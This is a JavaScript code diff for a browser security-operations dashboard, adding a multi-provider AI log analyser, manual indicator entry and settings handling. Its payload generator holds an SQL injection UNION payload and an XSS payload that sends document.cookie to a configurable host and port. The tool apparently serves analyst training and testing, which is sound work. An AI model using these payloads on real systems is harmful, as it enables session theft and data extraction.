     this.angle = (this.angle + 0.03) % (Math.PI * 2);
@@ -1696,7 +1707,7 @@ function generatePayload() {
       p = `' UNION SELECT null, username, password, null FROM users-- -`;
       break;
     case 'xss-cookie':
-      // Safe string concatenation prevents browser tokenizer termination
+      // Safe string concatenation prevents HTML tokenizer termination
       p = '<script>new Image().src="http://' + host + ':' + port + '/?cookie="+encodeURIComponent(document.cookie);<' + '/script>';
       break;
   }
@@ -1751,7 +1762,7 @@ function copyContainment() {
 }
 
 /* ============================================================
-   IoC VAULT
+   IoC VAULT & MANUAL ENTRY
 ============================================================ */
 function updateIocs(report) {
   const container = document.getElementById('iocContainer');
@@ -1760,26 +1771,60 @@ function updateIocs(report) {
   if (iocs.length > 0) { b.textContent = iocs.length; b.classList.remove('hidden'); }
 
   if (!iocs.length) {
-    container.innerHTML = `<div class="panel" style="padding:30px;text-align:center;color:var(--text-2);">No indicators in current telemetry.</div>`;
+    container.innerHTML = `<div class="panel" style="padding:30px;text-align:center;color:var(--text-2);">No indicators in current telemetry. Click "+ Add IoC" to add manually.</div>`;
     return;
   }
 
   container.innerHTML = `
     <div class="panel" style="padding:16px;">
       <div style="display:flex;flex-direction:column;gap:8px;">
-        ${iocs.map(i => `
+        ${iocs.map((i, idx) => `
           <div style="padding:10px 14px;background:rgba(0,0,0,0.45);border:1px solid var(--border);border-radius:6px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;">
             <div style="display:flex;gap:10px;align-items:center;">
               <span class="badge badge-red">${i.type.toUpperCase()}</span>
               <span style="font-weight:700;color:var(--text-0);">${i.value}</span>
               <span style="font-size:11px;color:var(--text-2);">${i.context}</span>
             </div>
-            <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${i.value}', 'IoC copied')">Copy</button>
+            <div style="display:flex;gap:6px;">
+              <button class="btn btn-ghost btn-sm" onclick="copyToClipboard('${i.value}', 'IoC copied')">Copy</button>
+              <button class="btn btn-ghost btn-sm" style="color:var(--red);" onclick="deleteIoc(${idx})">✕</button>
+            </div>
           </div>
         `).join('')}
       </div>
     </div>
   `;
+}
+
+function openAddIocModal() { document.getElementById('addIocModal').classList.remove('hidden'); }
+function closeAddIocModal() { document.getElementById('addIocModal').classList.add('hidden'); }
+
+function submitManualIoc() {
+  const type = document.getElementById('manualIocType').value;
+  const val = document.getElementById('manualIocValue').value.trim();
+  const ctx = document.getElementById('manualIocContext').value.trim() || 'Manual Hunt Entry';
+
+  if (!val) return toast('warn', 'Value Required', 'Please enter an indicator value.');
+
+  if (!STATE.lastReport) STATE.lastReport = INITIAL_BASELINE_SESSION;
+  if (!STATE.lastReport.detected_iocs) STATE.lastReport.detected_iocs = [];
+
+  STATE.lastReport.detected_iocs.unshift({ type: type, value: val, context: ctx });
+  updateIocs(STATE.lastReport);
+  updateContainmentOutput();
+  closeAddIocModal();
+  document.getElementById('manualIocValue').value = '';
+  document.getElementById('manualIocContext').value = '';
+  toast('success', 'IoC Added', `${val} added to vault.`);
+}
+
+function deleteIoc(index) {
+  if (STATE.lastReport && STATE.lastReport.detected_iocs) {
+    STATE.lastReport.detected_iocs.splice(index, 1);
+    updateIocs(STATE.lastReport);
+    updateContainmentOutput();
+    toast('info', 'Deleted', 'Indicator removed from vault.');
+  }
 }
 
 function copyAllIocs() {
@@ -1797,30 +1842,96 @@ function exportIocsCSV() {
 }
 
 /* ============================================================
-   AUTONOMOUS HEURISTIC AI & GEMINI HYBRID ENGINE
+   MULTI-AI PROVIDER HUB (7 PROVIDERS + FREE LOCAL ENGINE)
 ============================================================ */
+function switchProvider(prov) {
+  STATE.activeProvider = prov;
+  document.getElementById('aiProviderSelect').value = prov;
+  document.getElementById('settingsProviderSelect').value = prov;
+
+  const badge = document.getElementById('activeProviderBadge');
+  const keyInput = document.getElementById('apiKeyInput');
+  const persistKey = document.getElementById('persistKey');
+
+  const savedKey = localStorage.getItem('secops_key_' + prov) || '';
+  keyInput.value = savedKey;
+  persistKey.value = savedKey;
+
+  if (prov === 'heuristic') {
+    badge.className = 'badge badge-green';
+    badge.textContent = 'HEURISTIC (FREE)';
+    keyInput.placeholder = 'No API key needed (100% free local core)';
+  } else {
+    badge.className = 'badge badge-cyan';
+    badge.textContent = prov.toUpperCase() + ' (AI CLOUD)';
+    keyInput.placeholder = `Enter your ${prov.toUpperCase()} API key`;
+  }
+}
+
 const AutonomousEngine = {
-  analyzeTelemetry: async function (logs, apiKey) {
-    if (apiKey && apiKey.trim().startsWith('AIzaSy')) {
+  analyzeTelemetry: async function (logs) {
+    const prov = STATE.activeProvider || 'heuristic';
+    const key = document.getElementById('apiKeyInput').value.trim() || localStorage.getItem('secops_key_' + prov) || '';
+
+    // If API Key is present and provider is an AI service, query the provider
+    if (prov !== 'heuristic' && key) {
       try {
-        const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${apiKey.trim()}`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            contents: [{ parts: [{ text: `Act as a SOC Tier-3 Lead. Analyze logs and return JSON with keys: severity ("CRITICAL"|"HIGH"|"MEDIUM"|"LOW"), threat_score (0-100), threat_title, executive_summary, detected_iocs ([{type, value, context}]), mitre_techniques ([{id, name, tactic}]), target_services ([string]), recommendations ([string]), chart_metrics ({labels, severity_curve}). Logs:\n${logs.slice(0, 3000)}` }] }],
-            generationConfig: { responseMimeType: 'application/json' }
-          })
-        });
-        const d = await res.json();
-        const parsed = JSON.parse(d.candidates[0].content.parts[0].text);
-        parsed.engine = 'Google Gemini 1.5 Flash Cloud Core';
-        return parsed;
-      } catch (e) {
-        toast('warn', 'AI Fallback', 'Gemini API query failed. Engaging local 100% verified heuristic neural rules.');
+        if (prov === 'gemini') return await AutonomousEngine.callGemini(logs, key);
+        if (prov === 'groq') return await AutonomousEngine.callOpenAICompatible('https://api.groq.com/openai/v1/chat/completions', 'llama-3.3-70b-versatile', key, logs, 'Groq Cloud');
+        if (prov === 'openrouter') return await AutonomousEngine.callOpenAICompatible('https://openrouter.ai/api/v1/chat/completions', 'meta-llama/llama-3.1-8b-instruct:free', key, logs, 'OpenRouter');
+        if (prov === 'mistral') return await AutonomousEngine.callOpenAICompatible('https://api.mistral.ai/v1/chat/completions', 'mistral-small-latest', key, logs, 'Mistral AI');
+        if (prov === 'openai') return await AutonomousEngine.callOpenAICompatible('https://api.openai.com/v1/chat/completions', 'gpt-4o-mini', key, logs, 'OpenAI');
+      } catch (err) {
+        toast('warn', 'AI API Error', `${prov.toUpperCase()} failed: ${err.message}. Engaging free heuristic neural core.`);
       }
     }
 
-    // Heuristic Engine
+    // Default: 100% Free Autonomous Local Heuristic Engine
+    return AutonomousEngine.localSOCHeuristic(logs);
+  },
+
+  callGemini: async function(logs, key) {
+    const prompt = `Act as a SOC Tier-3 Lead. Analyze logs and return strictly JSON with keys: severity ("CRITICAL"|"HIGH"|"MEDIUM"|"LOW"), threat_score (0-100), threat_title, executive_summary, detected_iocs ([{type, value, context}]), mitre_techniques ([{id, name, tactic}]), target_services ([string]), recommendations ([string]), chart_metrics ({labels, severity_curve}). Logs:\n${logs.slice(0, 3000)}`;
+    const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${key}`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        contents: [{ parts: [{ text: prompt }] }],
+        generationConfig: { responseMimeType: 'application/json' }
+      })
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const d = await res.json();
+    const parsed = JSON.parse(d.candidates[0].content.parts[0].text);
+    parsed.engine = 'Google Gemini 1.5 Flash Cloud';
+    return parsed;
+  },
+
+  callOpenAICompatible: async function(url, model, key, logs, name) {
+    const sysPrompt = 'You are a SOC Tier-3 Threat Intelligence System. Output ONLY valid JSON with keys: severity ("CRITICAL"|"HIGH"|"MEDIUM"|"LOW"), threat_score (0-100), threat_title, executive_summary, detected_iocs ([{type, value, context}]), mitre_techniques ([{id, name, tactic}]), target_services ([string]), recommendations ([string]), chart_metrics ({labels, severity_curve}).';
+    const res = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + key
+      },
+      body: JSON.stringify({
+        model: model,
+        response_format: { type: 'json_object' },
+        messages: [
+          { role: 'system', content: sysPrompt },
+          { role: 'user', content: `Analyze these logs:\n${logs.slice(0, 3000)}` }
+        ]
+      })
+    });
+    if (!res.ok) throw new Error('HTTP ' + res.status);
+    const d = await res.json();
+    const parsed = JSON.parse(d.choices[0].message.content);
+    parsed.engine = `${name} (${model})`;
+    return parsed;
+  },
+
+  localSOCHeuristic: function (logs) {
     const lower = logs.toLowerCase();
     const iocs = [];
     const mitre = [];
@@ -1871,7 +1982,7 @@ const AutonomousEngine = {
       mitre_techniques: mitre,
       target_services: targetServices.length ? targetServices : ['Network Edge Gateway'],
       recommendations: recommendations.length ? recommendations : ['Maintain passive logging baselines.'],
-      engine: 'SecOps Autonomous Heuristic Engine v2.0',
+      engine: 'SecOps Autonomous Heuristic Engine v2.0 (Free)',
       chart_metrics: {
         labels: ['Recon', 'Weaponize', 'Deliver', 'Exploit', 'C2'],
         severity_curve: [30, 50, 75, score, Math.max(20, score * 0.5)]
@@ -1880,18 +1991,20 @@ const AutonomousEngine = {
   }
 };
 
+/* ============================================================
+   EXECUTION & REPORT RENDERING
+============================================================ */
 async function runAnalysis() {
   const logs = document.getElementById('logStream').value.trim();
-  const key = document.getElementById('apiKeyInput').value.trim() || localStorage.getItem('secops_key') || '';
   const btn = document.getElementById('analyzeBtn');
 
-  if (!logs) return toast('warn', 'Telemetry Required', 'Paste log data or click an attack scenario.');
+  if (!logs) return toast('warn', 'Telemetry Required', 'Paste log data or load a scenario.');
 
   btn.disabled = true;
   btn.textContent = 'Analyzing Telemetry...';
 
   try {
-    const rep = await AutonomousEngine.analyzeTelemetry(logs, key);
+    const rep = await AutonomousEngine.analyzeTelemetry(logs);
     STATE.lastReport = rep;
     STATE.analyses++;
     STATE.threatScore = rep.threat_score;
@@ -2135,10 +2248,19 @@ function addFeedItem(r) {
 function clearFeed() { document.getElementById('activityFeed').innerHTML = ''; }
 function showNotifications() { toast('info', 'Incident Queue', `${STATE.analyses} incident record(s) armed.`); }
 function saveSettings() {
-  localStorage.setItem('secops_key', document.getElementById('persistKey').value.trim());
-  toast('success', 'Saved', 'Gemini API Key saved.');
+  const prov = STATE.activeProvider || 'heuristic';
+  const key = document.getElementById('persistKey').value.trim();
+  localStorage.setItem('secops_key_' + prov, key);
+  document.getElementById('apiKeyInput').value = key;
+  toast('success', 'Saved', `${prov.toUpperCase()} configuration persisted.`);
 }
-function resetSettings() { localStorage.removeItem('secops_key'); toast('info', 'Reset', 'Defaults restored.'); }
+function resetSettings() {
+  localStorage.clear();
+  document.getElementById('persistKey').value = '';
+  document.getElementById('apiKeyInput').value = '';
+  switchProvider('heuristic');
+  toast('info', 'Reset', 'Defaults restored.');
+}
 function toggleMatrix(v) { if (v === 'off') window.matrixControl.stop(); else window.matrixControl.start(); }
 function openHex() { document.getElementById('hexBody').textContent = document.getElementById('logStream').value || 'No telemetry in buffer.'; document.getElementById('hexModal').classList.remove('hidden'); }
 function closeHex() { document.getElementById('hexModal').classList.add('hidden'); }
@@ -2149,6 +2271,7 @@ function printAudit() { window.print(); }
 ============================================================ */
 function bootstrap() {
   Radar.init();
+  Radar.setScore(0);
 
   const ti = document.getElementById('termInput');
   if (ti) {
@@ -2182,14 +2305,28 @@ function bootstrap() {
     });
   }
 
-  // Pre-load Baseline State
+  // Clean Standby State
   termPrint('SecOps-AI Sentinel OS Shell v2.0 Armed & Ready.', 'info');
   termPrint('Type "help" or click any command chip below to execute.', 'dim');
   
-  addFeedItem(INITIAL_BASELINE_SESSION);
-  renderReport(INITIAL_BASELINE_SESSION);
-  updateMitre(INITIAL_BASELINE_SESSION);
-  updateIocs(INITIAL_BASELINE_SESSION);
+  const feed = document.getElementById('activityFeed');
+  if (feed) {
+    feed.innerHTML = `
+      <div class="feed-item">
+        <div class="icon-wrap">
+          <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="var(--green)" stroke-width="2"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/></svg>
+        </div>
+        <div style="flex:1;min-width:0;">
+          <div style="font-size:12px;font-weight:600;color:var(--text-0);">Sentinel Core Initialized</div>
+          <div style="font-size:10px;color:var(--text-2);">System standing by. Waiting for incoming telemetry.</div>
+        </div>
+        <div class="num" style="font-size:10px;color:var(--text-2);">${new Date().toLocaleTimeString()}</div>
+      </div>
+    `;
+  }
+
+  updateMitre(null);
+  updateIocs(null);
   updateContainmentOutput();
   updateExportOutput();
   generatePayload();
